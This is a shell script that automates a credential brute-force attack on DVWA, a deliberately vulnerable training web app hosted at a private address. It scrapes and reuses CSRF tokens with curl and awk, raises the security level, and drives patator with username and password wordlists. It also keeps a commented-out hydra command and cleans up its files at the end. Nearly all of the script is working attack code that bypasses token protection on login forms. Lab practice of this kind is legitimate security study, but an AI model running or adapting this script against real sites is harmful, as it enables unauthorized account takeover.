#Connect to the actual page for brute force
# curl -s -i -L 192.168.178.98/dvwa/vulnerabilities/brute/  > vuln
#
#Login with the found login
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to high (impossible by default)
CSRFSEC=$(curl -s -i -L -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
curl -s -i -L -b dvwa.cookie -c dvwa.cookie.high -d $"security=high&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "bruteforce" page
curl -s -i -L -b dvwa.cookie.high -c dvwa.cookie.high 192.168.178.98/dvwa/vulnerabilities/brute/ > vuln
#Get new CSRF, Send our known login
CSRFHIGH=$(cat vuln | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
#Hydra can't do the job like this, no new CSRF tokens are useable
# rm hydra.restore
# hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -d -u -F -w 10 -W 1 -V 192.168.178.98 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRFHIGH}:S=Welcome:H=Cookie: security=high; PHPSESSID=${SESSIONID}:C=/404.php"
#Use patator for attack (lacks highlighting for positive matches)
python ~/Desktop/patator/patator.py http_fuzz method=GET follow=0 accept_cookie=0 --threads=1 timeout=5 --max-retries=0 url="http://192.168.178.98/dvwa/vulnerabilities/brute/?username=FILE1&password=FILE0&user_token=TOKEN&Login=Login" 1=/Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt 0=/Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt header="Cookie: security=high; PHPSESSID=${SESSIONID}" before_urls="http://192.168.178.98/dvwa/vulnerabilities/brute/" before_header="Cookie: security=high; PHPSESSID=${SESSIONID}" before_egrep="TOKEN:value='(\w+)'" -x quit:fgrep="Welcome" -l log/
rm -f dvwa.cookie*
rm -f vuln
rm -rf log
